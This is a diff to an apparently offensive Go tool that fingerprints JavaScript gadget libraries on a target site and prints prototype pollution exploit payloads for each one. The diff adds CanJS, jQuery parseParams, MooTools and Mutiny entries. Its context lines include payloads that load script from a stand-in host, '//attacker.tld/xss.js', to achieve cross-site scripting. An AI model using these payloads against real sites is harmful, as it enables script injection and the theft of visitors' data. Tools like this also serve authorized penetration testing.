@@ -1,7 +1,7 @@
 package main
-import"os"
-import "bufio"
 import (
+    "os"
+    "bufio"
     "context"
     "math/rand"
     "log"
@@ -31,8 +31,6 @@ var fingerprint string = `(() => {
     gadgets = 'DOMPurify ';
   } else if (typeof window.embedly !== 'undefined') {
     gadgets = 'Embedly Cards ';
-  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
-    gadgets = 'jQuery ';
   } else if (typeof filterXSS !== 'undefined') {
     gadgets = 'js-xss ';
   } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
@@ -71,6 +69,16 @@ var fingerprint string = `(() => {
     gadgets = "Demandbase Tag";
   } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
     gadgets = "Google Tag Manager plugin for analytics";
+  } else if (typeof can != 'undefined' && typeof can.deparam != 'undefined') {
+    gadgets = "CanJS deparam";
+  } else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
+    gadgets = "jQuery parseParams";
+  } else if (typeof String.parseQueryString != 'undefined') {
+    gadgets = "MooTools More";
+  } else if (typeof mutiny != 'undefined') {
+    gadgets = "Mutiny"
+  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
+    gadgets = 'jQuery ';
   }
 
  return gadgets;
@@ -79,7 +87,7 @@ var fingerprint string = `(() => {
 
 func main() {
     fmt.Printf(`                                                                                 
-    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.2
+    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.3
    dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
   dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
  dMP     dMP     dMP dMP dMP dMP dMP dMP           
@@ -253,6 +261,20 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?")
             } else if strings.Contains(string(res1), "Google Tag Manager plugin for analytics") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[customScriptSrc]=//attacker.tld/xss.js")  
+            } else if strings.Contains(string(res1), "CanJS deparam") {
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__[test]=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")
+            } else if strings.Contains(string(res1), "jQuery parseParams") {
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__.test=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor.prototype.test=test")    
+            } else if strings.Contains(string(res1), "MooTools More")   {    
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__[test]=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")              
+            } else if strings.Contains(string(res1), "Mutiny") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__.test=test")   
             } else {
                log.Printf(Error + " An unexcepted error occured")
             }
